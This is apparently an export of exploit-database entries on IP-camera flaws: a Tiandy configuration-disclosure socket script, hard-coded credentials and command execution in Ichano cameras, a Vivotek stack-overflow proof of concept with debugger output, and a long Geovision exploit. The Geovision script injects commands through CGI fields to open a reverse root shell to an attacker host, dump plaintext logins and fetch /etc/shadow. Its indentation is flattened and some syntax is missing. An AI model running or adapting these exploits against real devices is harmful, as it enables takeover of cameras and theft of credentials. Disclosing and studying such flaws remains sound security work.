2017-08-03,WebApps,Hardware,SecuriTeam,Tiandy IP Cameras 5.56.17.120,Sensitive Information Disclosure,"## Vulnerability Summary
## Credit
## Vendor response
## Vulnerability details
## Proof of Concept
## POC.PY","The following advisory describes sensitive information Disclosure found in Tiandy IP cameras version 5.56.17.120
Tianjin Tiandy Digital Technology Co., Ltd ( Tiandy Tech) is “one of top 10 leading CCTV manufacturer in China and a global supplier of advanced video surveillance solutions.”
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
We tried to contact Tiandy starting from August 16 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.
CVE: CVE-2017-15236
Tiandy uses a proprietary protocol, a flaw in the protocol allows an attacker to forge a request that will return configuration settings of the Tiandy IP camera.
By sending the following request, an attacker can download the following files:
config_server.ini
extendword.txt
config_ptz.dat
config_right.dat
config_dg.dat
config_burn.dat
import socket
ip = '192.168.1.1'
data1 = '\x74\x1f\x4a\x84\xc8\xa8\xe4\xb3\x18\x7f\xd2\x21\x08\x00\x45\x00\x00\xcc\x3e\x9a\x40\x00\x40\x06\xd4\x13\xac\x10\x65\x75\x6e\x31\xa7\xc7\x43\x5b\x0b\xb9\x85\xbc\x1d\xf0\x5b\x3e\xe8\x32\x50' +
'\x18\x7f\xa4\xc6\xcf\x00\x00\xf1\xf5\xea\xf5\x74\x00\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00' + ip +
'\x09\x50\x52\x4f\x58\x59\x09\x43\x4d\x44\x09\x44\x48\x09\x43\x46\x47\x46\x49\x4c\x45\x09\x44\x4f\x57\x4e\x4c\x4f\x41\x44\x09\x36\x09\x63\x6f\x6e\x66\x69\x67\x5f\x73\x65\x72\x76\x65\x72\x2e' +
'\x69\x6e\x69\x09\x65\x78\x74\x65\x6e\x64\x77\x6f\x72\x64\x2e\x74\x78\x74\x09\x63\x6f\x6e\x66\x69\x67\x5f\x70\x74\x7a\x2e\x64\x61\x74\x09\x63\x6f\x6e\x66\x69\x67\x5f\x72\x69\x67\x68\x74\x2e' +
'\x64\x61\x74\x09\x63\x6f\x6e\x66\x69\x67\x5f\x64\x67\x2e\x64\x61\x74\x09\x63\x6f\x6e\x66\x69\x67\x5f\x62\x75\x72\x6e\x2e\x64\x61\x74\x0a\x0a\x0a'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,3001))
s.send(data1)
while True:
buf = s.recv(64)
if not len(buf):
break
print buf"
2017-12-19,Remote,Hardware,SecuriTeam,Ichano AtHome IP Cameras,Multiple Vulnerabilities,"## Vulnerabilities Summary
## Credit
## Vendor response
## Vulnerabilities details","The following advisory describes three (3) vulnerabilities found in Ichano IP Cameras.
AtHome Camera is “a remote video surveillance app which turns your personal computer, smart TV/set-top box, smart phone, and tablet into a professional video monitoring system in a minute.”
The vulnerabilities found are:
Hard-coded username and password – telnet
Hard-coded username and password – Web server
Unauthenticated Remote Code Execution
An independent security researcher, Tim Carrington, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
We tried to contact Ichano since November 21st 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for these vulnerabilities.
CVE: CVE-2017-17761
Hard-coded username and password – telnet
The device runs a telnet server at startup with a default password of 123.
Hard-coded username and password – Web server
In /app/www/doc/script/login.js, in the function DoLogin(), client side validation is used to login a user:
if($(""#UserName"").val()==""super_yg""){jumpPage();return}
A user can login with these credentials and can then take control of the device over http:
Unauthenticated Remote Code Execution
The device runs “noodles” binary – a service on port 1300 that allows a remote (LAN) unauthenticated user to run arbitrary commands.
The binary has a set of commands he can run – if a user will use the following “protocol”, command to be run is enclosed like html tags, i.e. <system>id</system>, a successful execution results in <system_ack>ok</system_ack>."
2017-12-12,Remote,Multiple,bashis,Vivotek IP Cameras,Remote Stack Overflow (PoC),"#0  0x58585858 in ?? ()
#1  0x000188f4 in ?? ()
#0  0x58585858 in ?? ()
#1  0x000188f4 in ?? ()","[STX]
Subject: Vivotek IP Cameras - Remote Stack Overflow
Researcher: bashis <mcw noemail eu> (September-October 2017)
PoC: https://github.com/mcw0/PoC
Release date: November 13, 2017
Full Disclosure: 43 days
Attack Vector: Remote
Authentication: Anonymous (no credentials needed)
Firmware Vulnerable: Only 2017 versions affected
Firmware Patched: October 2017 and higher
Device Model:
CC8160, CC8370, CC8371, CD8371, FD8166A, FD8166A, FD8166A-N, FD8167A, FD8167A, FD8167AS,
FD8167AS, FD8169A, FD8169A, FD8169A, FD8169AS, FD8169AS, FD816B, FD816B, FD816BA, FD816BA,
FD816C, FD816C, FD816CA, FD816CA, FD816D, FD8177, FD8179, FD8182, FD8182, FD8182-F1,
FD8365A_v2, FD8367A, FD8367A, FD8369A, FD8369A, FD836B, FD836BA, FD836D, FD8377, FD8379,
FD8382, FD9171, FD9181, FD9371, FD9381, FE8174_v2, FE8181_v2, FE8182, FE8374_v2, FE8381_v2,
FE9181, FE9182, FE9381, FE9382, IB8367A, IB8369A, IB836B, IB836BA, IB836D, IB8377,
IB8379, IB8382, IB9371, IB9381, IP8166, IP9171, IP9181, IZ9361, MD8563, MD8564,
MD8565, SD9161, SD9361, SD9362, SD9363, SD9364, SD9365, SD9366, VC8101... and possible more
Download Updated Firmware: http://www.vivotek.com/firmware/
[Timeline]
October 1, 2017: Reported findings with all details to Vivotek Cybersecurity
October 2, 2017: First response from Vivotek
October 5, 2017: ACK of findings from Vivotek
October 11, 2017: Vivotek reported first fixed Firmware
October 12, 2017: After request, Vivotek provided samples of fixed Firmware
October 17, 2017: Verified fixed Firmware, Vivotek thanking for the help
October 30, 2017: Noticed new Firmware released, pinged to get some info about their advisory
November 1, 2017: Agreed on publication November 13, 2017
November 9, 2017: Checked few release notes, none mention security fix; pinged Vivotek with the question why not.
November 13, 2017: No reply from Vivotek, Full Disclosure as planned.
[Details]
Vivotek using modified version of Boa/0.94.14rc21, and the vulnerability has been introduced by Vivotek.
The stack overflow is triggered by ""PUT"" or ""POST"" request:
[PUT|POST] /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n
However,
the absolutely minimal request to trigger the stack overflow is weird, most probably due to quick hack:
""[PUT|POST]Content-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n""
This allows us to insert [JUNK] with 'Good bytes' up to 9182 bytes (0x1FFF) of the request:
""[PUT|POST][JUNK]Content-Length[JUNK]:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n""
Notes:
1. B to I = $R4-$R11; X = $PC
2. Size of request availible in $R3 at the LDMFD
3. Max request size: 9182 bytes (0x1FFF)
4. ""Start with ""\n"" in ""\n\r\n\r\n"" needed to jump with 0x00xxxxxx (if not $PC will be 0x0dxxxxxx)
5. Space (0x20) after ':' in 'Content-Length:' counting as one char of the 20 bytes
6. Stack not protected with ""Stack canaries""
7. Good bytes: 0x01-0x09, 0x0b-0xff; Bad bytes: 0x00, 0x0a;
8. heap: Non-executable + Non-ASLR
9. stack: Non-executable + ASLR
[PoC]
$ echo -en ""POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n""  | ncat -v 192.168.57.20 80
(gdb) target remote 192.168.57.20:23946
Remote debugging using 192.168.57.20:23946
0x76eb2c5c in ?? ()
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x58585858 in ?? ()
(gdb) bt
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0x11
r1             0x47210291344
r2             0x00
r3             0x75117
r4             0x424242421111638594
r5             0x434343431128481603
r6             0x444444441145324612
r7             0x454545451162167621
r8             0x464646461179010630
r9             0x474747471195853639
r10            0x484848481212696648
r11            0x494949491229539657
r12            0x11
sp             0x7e92dac00x7e92dac0
lr             0x188f4100596
pc             0x585858580x58585858
cpsr           0x600000101610612752
(gdb)
$ echo -en ""PUTContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"" | ncat -v 192.168.57.20 80
(gdb) target remote 192.168.57.20:23946
Remote debugging using 192.168.57.20:23946
0x76e82c5c in ?? ()
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x58585858 in ?? ()
(gdb) bt
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0x11
r1             0x47210291344
r2             0x00
r3             0x4f79
r4             0x424242421111638594
r5             0x434343431128481603
r6             0x444444441145324612
r7             0x454545451162167621
r8             0x464646461179010630
r9             0x474747471195853639
r10            0x484848481212696648
r11            0x494949491229539657
r12            0x11
sp             0x7ec9cac00x7ec9cac0
lr             0x188f4100596
pc             0x585858580x58585858
cpsr           0x600000101610612752
(gdb)
Have a nice day
/bashis
[ETX]"
2018-02-01,Remote,Hardware,bashis,Geovision Inc. IP Camera & Video,Remote Command Execution,"#!/usr/bin/env python2.7
# [SOF]
# Geovision Inc. IP Camera & Video Server Remote Command Execution PoC
# Researcher: bashis <mcw noemail eu> (November 2017)
# 1. Pop stunnel TLSv1 reverse root shell [Local listener: 'ncat -vlp <LPORT> --ssl'; Verified w/ v7.60]
# 2. Dump all settings of remote IPC with Login/Passwd in cleartext
# Using:
# - CGI: 'Usersetting.cgi' (Logged in user) < v3.12 (Very old) [Used as default]
# - CGI: 'FilterSetting.cgi' (Logged in user) < v3.12 (Very old)
# - CGI: 'PictureCatch.cgi' (Anonymous) > v3.10
# - CGI: 'JpegStream.cgi' (Anonymous) > v3.10
# 3. GeoToken PoC to login and download /etc/shadow via generated token symlink
# Sample reverse shell:
# $ ncat -vlp 1337 --ssl
# Ncat: Version 7.60 ( https://nmap.org/ncat )
# Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
# Ncat: SHA-1 fingerprint: 3469 C118 43F0 043A 5168 189B 1D67 1131 4B5B 1603
# Ncat: Listening on :::1337
# Ncat: Listening on 0.0.0.0:1337
# Ncat: Connection from 192.168.57.20.
# Ncat: Connection from 192.168.57.20:16945.
# /bin/sh: can't access tty; job control turned off
# /www # id
# id
# uid=0(root) gid=0(root)
# /www # uname -a
# uname -a
# Linux IPCAM 2.6.18_pro500-davinci #1 Mon Jun 19 21:27:10 CST 2017 armv5tejl unknown
# /www # exit
# $
#from pwn import *
# Ignore download of '302 Found/Location' redirections
# Connect-timeout in seconds
# Don't follow redirects!
# Validate correctness of HOST, IP and PORT
# Check if IP is valid
# Check if PORT is valid
# Check if HOST is valid
# Check valid IP
# Now we check if it is correct typed IP
# Else check valid DNS name, and use the IP address
#print response
# Geovision way to have MD5 random Login and Password
# Less interesting to know, but leave it here anyway.
# If the remote server has enabled guest view, these below will not be '0'
# Geovision MD5 Format
#print ""[i] User MD5: {}"".format(uMD5)
#print ""[i] Pass MD5: {}"".format(pMD5)
#print response.info()
# if we don't get 'Set-Cookie' back from the server, the Login has failed
# Interesting example of bad code and insufficent sanitation of user input.
# ';' is filtered in v3.12, and when found in the packet, the packet is simply ignored.
# Later in the chain the Geovision code will write provided userinput to flash, we may overwrite unwanted flash area if we playing to much here.
# So, we are limited to 31 char per line (32 MUST BE NULL), to play safe game with this bug.
# v3.10->3.12 changed how to handle ipfilter
# From:
# User input to system() call in FilterSetting.cgi to set iptable rules and then save them in flash
# To:
# User input transferred from 'FilterSetting.cgi' to flash (/dev/mtd11), and when the tickbox to activate the filter rules,
# '/usr/local/bin/geobox-iptables-reload' is triggered to read these rules from flash and '/usr/local/bin/iptables' via 'geo_net_filter_table_add'
# with system() call in 'libgeo_net.so'
# Should end up into;
# 23835 root        576 S   sh -c /usr/local/bin/iptables -A INPUT  -s `/usr/loca...[trunkated]
# 23836 root       2428 S   /usr/local/bin/stunnel /tmp/x
# 23837 root        824 S   /bin/sh
# ';' will be treated by the code as LF
# Let's use some TLSv1 privacy for the reverse shell
# Remove, just in case
# This loop will make the correct aligment of user input
# Add two more commands to execute stunnel and remove /tmp/x
# Below while() loop will create following /tmp/x, execute 'stunnel' and remove /tmp/x
# client=yes
# connect=<LHOST>:<LPORT>
# exec=/bin/sh
# pty=yes
# sslVersion=TLSv1
# Clean up to make room, just in case
# NEW Way
# OLD Way
# This is how to list remote *.wav and *.avi files in /storage.
# SAMPLE OUTPUT
#    ""success"": true,
#    ""token"": ""6fe1a7c1f34431acc7eaecba646b7caf""
# Generate correct MD5 token2
# SAMPLE OUTPUT
#    ""files"": [
#        {
#            ""file_size"": ""2904170"",
#            ""filename"": ""event20171105104946001.avi"",
#            ""remote_path"": ""/storage/hd11-1/GV-MFD1501-0a99a9/cam01/2017/11/05""
#        },
#        {}
#    ]
# Request remote MD5 token1
# SAMPLE OUTPUT
#    ""success"": true,
#    ""token"": ""6fe1a7c1f34431acc7eaecba646b7caf""
# Generate correct MD5 token2
# MD5 Format: <login>:<token1>:<password>
# symlink this file for us
# SAMPLE OUTPUT
#    ""dl_folder"": ""/tmp"",
#    ""dl_token"": ""C71689493825787.dltoken"",
#    ""err_code"": 0,
#    ""success"": true
# Help, info and pre-defined values
#creds = 'root:pass'
# Geovision stuff
# Geovision default
# Try to parse all arguments
# Check validity, update if needed, of provided options
# HTTP check of our external IP
# Check if RPORT is valid
# Check if RHOST is valid IP or FQDN, get IP back
# Check if LHOST is valid IP or FQDN, get IP back
# Check if RHOST is valid IP or FQDN, get IP back
# Validation done, start print out stuff to the user
# Print Model and Firmware version
# Geovision token login within the function
# Geovision Login needed
# [EOF]","import sys
import socket
import urllib, urllib2, httplib
import json
import hashlib
import commentjson # pip install commentjson
import xmltodict # pip install xmltodict
import select
import string
import argparse
import random
import base64
import ssl
import json
import os
import re
def split2len(s, n):
def _f(s, n):
while s:
yield s[:n]
s = s[n:]
return list(_f(s, n))
class NoRedirection(urllib2.HTTPErrorProcessor):
def http_response(self, request, response):
return response
https_response = http_response
class HTTPconnect:
def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
self.host = host
self.proto = proto
self.verbose = verbose
self.credentials = credentials
self.Raw = Raw
self.noexploit = False
self.noexploit = noexploit
def Send(self, uri, query_headers, query_data, ID):
self.uri = uri
self.query_headers = query_headers
self.query_data = query_data
self.ID = ID
timeout = 10
socket.setdefaulttimeout(timeout)
url = '{}://{}{}'.format(self.proto, self.host, self.uri)
if self.verbose:
print ""[Verbose] Sending:"", url
if self.proto == 'https':
if hasattr(ssl, '_create_unverified_context'):
print ""[i] Creating SSL Unverified Context""
ssl._create_default_https_context = ssl._create_unverified_context
if self.credentials:
Basic_Auth = self.credentials.split(':')
if self.verbose:
print ""[Verbose] User:"",Basic_Auth[0],""password:"",Basic_Auth[1]
try:
pwd_mgr = urllib2.HTTPpasswordMgrWithDefaultDahua_realm()
pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)
if verbose:
http_logger = urllib2.HTTPHandler(debuglevel = 1) # HTTPSHandler... for HTTPS
opener = urllib2.build_opener(auth_handler,NoRedirection,http_logger)
else:
opener = urllib2.build_opener(auth_handler,NoRedirection)
urllib2.install_opener(opener)
except Exception as e:
print ""[!] Basic Auth Error:"",e
sys.exit(1)
else:
if verbose:
http_logger = urllib2.HTTPHandler(debuglevel = 1)
opener = urllib2.build_opener(http_logger,NoRedirection)
urllib2.install_opener(opener)
else:
NoRedir = urllib2.build_opener(NoRedirection)
urllib2.install_opener(NoRedir)
if self.noexploit and not self.verbose:
print ""[<] 204 Not Sending!""
html =  ""Not sending any data""
return html
else:
if self.query_data:
req = urllib2.Request(url, data=urllib.urlencode(self.query_data,doseq=True), headers=self.query_headers)
if self.ID:
Cookie = 'CLIENT_ID={}'.format(self.ID)
req.add_header('Cookie', Cookie)
else:
req = urllib2.Request(url, None, headers=self.query_headers)
if self.ID:
Cookie = 'CLIENT_ID={}'.format(self.ID)
req.add_header('Cookie', Cookie)
rsp = urllib2.urlopen(req)
if rsp:
print ""[<] {}"".format(rsp.code)
if self.Raw:
return rsp
else:
html = rsp.read()
return html
class Validate:
def __init__(self,verbose):
self.verbose = verbose
def CheckIP(self,IP):
self.IP = IP
ip = self.IP.split('.')
if len(ip) != 4:
return False
for tmp in ip:
if not tmp.isdigit():
return False
i = int(tmp)
if i < 0 or i > 255:
return False
return True
def Port(self,PORT):
self.PORT = PORT
if int(self.PORT) < 1 or int(self.PORT) > 65535:
return False
else:
return True
def Host(self,HOST):
self.HOST = HOST
try:
socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
if self.CheckIP(self.HOST):
return self.HOST
else:
return False
except socket.error as e:
try:
self.HOST = socket.gethostbyname(self.HOST)
return self.HOST
except socket.error as e:
return False
class Geovision:
def __init__(self, rhost, proto, verbose, credentials, raw_request, noexploit, headers, SessionID):
self.rhost = rhost
self.proto = proto
self.verbose = verbose
self.credentials = credentials
self.raw_request = raw_request
self.noexploit = noexploit
self.headers = headers
self.SessionID = SessionID
def Login(self):
try:
print ""[>] Requesting keys from remote""
URI = '/ssi.cgi/Login.htm'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
response = response.read()[:1500]
response = re.split('[()<>?""\n_&;/ ]',response)
except Exception as e:
print ""[!] Can't access remote host... ({})"".format(e)
sys.exit(1)
try:
CC1 = ''
CC2 = ''
for check in range(0,len(response)):
if response[check] == 'cc1=':
CC1 = response[check+1]
print ""[i] Random key CC1: {}"".format(response[check+1])
elif response[check] == 'cc2=':
CC2 = response[check+1]
print ""[i] Random key CC2: {}"".format(response[check+1])
elif response[check] == 'GuestIdentify':
print ""[i] GuestIdentify: {}"".format(response[check+2])
elif response[check] == 'uid':
if response[check+2]:
print ""[i] uid: {}"".format(response[check+2])
else:
print ""[i] uid: {}"".format(response[check+3])
elif response[check] == 'pid':
if response[check+2]:
print ""[i] pid: {}"".format(response[check+2])
else:
print ""[i] pid: {}"".format(response[check+3])
if not CC1 and not CC2:
print ""[!] CC1 and CC2 missing!""
print ""[!] Cannot generate MD5, exiting..""
sys.exit(0)
uMD5 = hashlib.md5(CC1 + username + CC2).hexdigest().upper()
pMD5 = hashlib.md5(CC2 + password + CC1).hexdigest().upper()
self.query_args = {
""username"":"""",
""password"":"""",
""Apply"":""Apply"",
""umd5"":uMD5,
""pmd5"":pMD5,
""browser"":1,
""is_check_OCX_OK"":0
print ""[>] Logging in""
URI = '/LoginPC.cgi'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
if not (response.info().get('Set-Cookie')):
print ""[!] Login Failed!""
sys.exit(1)
if verbose:
print ""Cookie: {}"".format(response.info().get('Set-Cookie'))
return response.info().get('Set-Cookie')
except Exception as e:
print ""[i] What happen? ({})"".format(e)
exit(0)
def DeviceInfo(self):
try:
URI = '/PSIA/System/deviceInfo'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,None)
deviceinfo = xmltodict.parse(response)
print ""[i] Remote target: {} ({})"".format(deviceinfo['DeviceInfo']['model'],deviceinfo['DeviceInfo']['firmwareVersion'])
return True
except Exception as e:
print ""[i] Info about remote target failed ({})"".format(e)
return False
def UserSetting(self,DumpSettings):
self.DumpSettings = DumpSettings
if self.DumpSettings:
print ""[i] Dump Config of remote""
SH_CMD = '`echo ""<!--#include file=""SYS_CFG""-->"" >/var/www/tmp/Login.htm`'
else:
print ""[i] Launching TLSv1 privacy reverse shell""
self.headers = {
'Connection': 'close',
'Accept-Language':'en-US,en;q=0.8',
'Cache-Control':'max-age=0',
'User-Agent':'Mozilla',
'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
SH_CMD = ';echo -en \""$HTTP_ACCEPT connect=LHOST:LPORT\""|stunnel -fd 0;'
SH_CMD = SH_CMD.replace(""LHOST"",lhost)
SH_CMD = SH_CMD.replace(""LPORT"",lport)
print ""[>] Pwning Usersetting.cgi""
self.query_args = {
""umd5"":SH_CMD,
""pmd5"":""GEOVISION"",
""nmd5"":""PWNED"",
""cnt5"":"""",
""username"":"""",
""passwordOld"":"""",
""passwordNew"":"""",
""passwordRetype"":"""",
""btnSubmitAdmin"":""1"",
""submit"":""Apply""
try:
URI = '/UserSetting.cgi'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
if DumpSettings:
print ""[i] Dumping""
URI = '/ssi.cgi/tmp/Login.htm'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
print response
return True
except Exception as e:
if str(e) == ""timed out"" or str(e) == ""('The read operation timed out',)"":
print ""[!] Enjoy the shell... ({})"".format(e)
return True
def PictureCatch(self,DumpSettings):
self.DumpSettings = DumpSettings
if self.DumpSettings:
print ""[i] Dump Config of remote""
SH_CMD = '`echo ""<!--#include file=""SYS_CFG""-->"" >/var/www/tmp/Login.htm`'
else:
print ""[i] Launching TLSv1 privacy reverse shell""
self.headers = {
'Connection': 'close',
'Accept-Language':'en-US,en;q=0.8',
'Cache-Control':'max-age=0',
'User-Agent':'Mozilla',
'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
SH_CMD = ';echo -en \""$HTTP_ACCEPT connect=LHOST:LPORT\""|stunnel -fd 0;'
SH_CMD = SH_CMD.replace(""LHOST"",lhost)
SH_CMD = SH_CMD.replace(""LPORT"",lport)
print ""[>] Pwning PictureCatch.cgi""
self.query_args = {
""username"":SH_CMD,
""password"":""GEOVISION"",
""attachment"":""1"",
""channel"":""1"",
""secret"":""1"",
""key"":""PWNED""
try:
URI = '/PictureCatch.cgi'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
if DumpSettings:
print ""[i] Dumping""
URI = '/ssi.cgi/tmp/Login.htm'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
print response
return True
except Exception as e:
if str(e) == ""timed out"" or str(e) == ""('The read operation timed out',)"":
print ""[!] Enjoy the shell... ({})"".format(e)
return True
def JpegStream(self,DumpSettings):
self.DumpSettings = DumpSettings
if self.DumpSettings:
print ""[i] Dump Config of remote""
SH_CMD = '`echo ""<!--#include file=""SYS_CFG""-->"" >/var/www/tmp/Login.htm`'
else:
print ""[i] Launching TLSv1 privacy reverse shell""
self.headers = {
'Connection': 'close',
'Accept-Language':'en-US,en;q=0.8',
'Cache-Control':'max-age=0',
'User-Agent':'Mozilla',
'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
SH_CMD = ';echo -en \""$HTTP_ACCEPT connect=LHOST:LPORT\""|stunnel -fd 0;'
SH_CMD = SH_CMD.replace(""LHOST"",lhost)
SH_CMD = SH_CMD.replace(""LPORT"",lport)
print ""[>] Pwning JpegStream.cgi""
self.query_args = {
""username"":SH_CMD,
""password"":""GEOVISION"",
""attachment"":""1"",
""channel"":""1"",
""secret"":""1"",
""key"":""PWNED""
try:
URI = '/JpegStream.cgi'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
if DumpSettings:
print ""[i] Dumping""
URI = '/ssi.cgi/tmp/Login.htm'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,None,self.SessionID)
print response
return True
except Exception as e:
if str(e) == ""timed out"" or str(e) == ""('The read operation timed out',)"":
print ""[!] Enjoy the shell... ({})"".format(e)
return True
def FilterSetting(self):
try:
print ""[>] Pwning FilterSetting.cgi""
SH_CMD = 'client=yes;connect=LHOST:LPORT;exec=/bin/sh;pty=yes;sslVersion=TLSv1'
SH_CMD = SH_CMD.replace(""LHOST"",lhost)
SH_CMD = SH_CMD.replace(""LPORT"",lport)
ShDict = SH_CMD.split(';')
MAX_SIZE = 31 # Max Size of the strings to generate
LF = 0
LINE = 0
CMD = {}
CMD_NO_LF = ""`echo -n \""TMP\"">>/tmp/x`""
CMD_DO_LF = ""`echo \""TMP\"">>/tmp/x`""
SIZE = MAX_SIZE-(len(CMD_NO_LF)-3) # Size of availible space for our input in 'SH_CMD'
CMD[LINE] = ""`rm -f /tmp/x`""
URI = '/FilterSetting.cgi'
for cmd in range(0,len(ShDict)):
CMD_LF = math.ceil(float(len(ShDict[cmd])) / SIZE)
cmd_split = split2len(ShDict[cmd], SIZE)
for CMD_LEN in range(0,len(cmd_split)):
LINE += 1
LF += 1
if (len(cmd_split[CMD_LEN]) > SIZE-1) and (CMD_LF != LF):
CMD[LINE] = CMD_NO_LF.replace(""TMP"",cmd_split[CMD_LEN])
else:
CMD[LINE] = CMD_DO_LF.replace(""TMP"",cmd_split[CMD_LEN])
LF = 0
if verbose:
print ""Len: {} {}"".format(len(CMD[LINE]),CMD[LINE])
CMD[LINE+1] = ""`/usr/local/bin/stunnel /tmp/x`"" # 31 char, no /usr/local/bin in $PATH
CMD[LINE+2] = ""`rm -f /tmp/x`"" # Some bug here, think it is timing as below working
CMD[LINE+3] = ""`rm -f /tmp/x`"" # Working, this is only one more add/enable/disable/remove loop
NEW_IP_FILTER = 1 # > v3.12
CMD_LEN = 0
who = 0
for Remove in range(0,4):
print ""[>] Cleaning ipfilter entry: {}"".format(Remove+1)
self.query_args = {
""bPolicy"":""0"",# 1 = Enable, 0 = Disable
""Delete"":""Remove"",# Remove entry
""szIpAddr"":"""",
""byOpId"":""0"",# 0 = Allow, 1 = Deny
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
while True:
if who == len(CMD):
break
if CMD_LEN < 4:
print ""[>] Sending: {} ({})"".format(CMD[who],len(CMD[who]))
self.query_args = {
""szIpAddr"":CMD[who], # 31 char limit
""byOpId"":""0"", # 0 = Allow, 1 = Deny
""dwSelIndex"":""0"", # Seems not to be in use
""Add"":""Apply""
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,False,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
response = re.split('[()<>?""\n_&;/ ]',response)
print response
if NEW_IP_FILTER:
for cnt in range(0,len(response)):
if response[cnt] == 'iptables':
NEW_IP_FILTER = 0
print ""[i] Remote don't need Enable/Disable""
break
CMD_LEN += 1
who += 1
time.sleep(2) # Seems to be too fast without
elif NEW_IP_FILTER:
print ""[>] Enabling ipfilter""
self.query_args = {
""bPolicy"":""1"", # 1 = Enable, 0 = Disable
""szIpAddr"":"""",
""byOpId"":""0"", # 0 = Allow, 1 = Deny
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
print ""[i] Sleeping...""
time.sleep(5)
print ""[>] Disabling ipfilter""
self.query_args = {
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
for Remove in range(0,4):
print ""[>] Deleting ipfilter Entry: {}"".format(Remove+1)
self.query_args = {
""bPolicy"":""0"", # 1 = Enable, 0 = Disable
""Delete"":""Remove"",
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
CMD_LEN = 0
else:
for Remove in range(0,4):
print ""[>] Deleting ipfilter Entry: {}"".format(Remove+1)
self.query_args = {
""bPolicy"":""0"", # 1 = Enable, 0 = Disable
""Delete"":""Remove"",
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
CMD_LEN = 0
if NEW_IP_FILTER:
print ""[i] Last sending""
print ""[>] Enabling ipfilter""
self.query_args = {
""bPolicy"":""1"", # 1 = Enable, 0 = Disable
""szIpAddr"":"""",
""byOpId"":""0"", # 0 = Allow, 1 = Deny
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
print ""[i] Sleeping...""
time.sleep(5)
print ""[>] Disabling ipfilter""
self.query_args = {
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
for Remove in range(0,4):
print ""[>] Deleting ipfilter Entry: {}"".format(Remove+1)
self.query_args = {
""bPolicy"":""0"", # 1 = Enable, 0 = Disable
""Delete"":""Remove"",
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
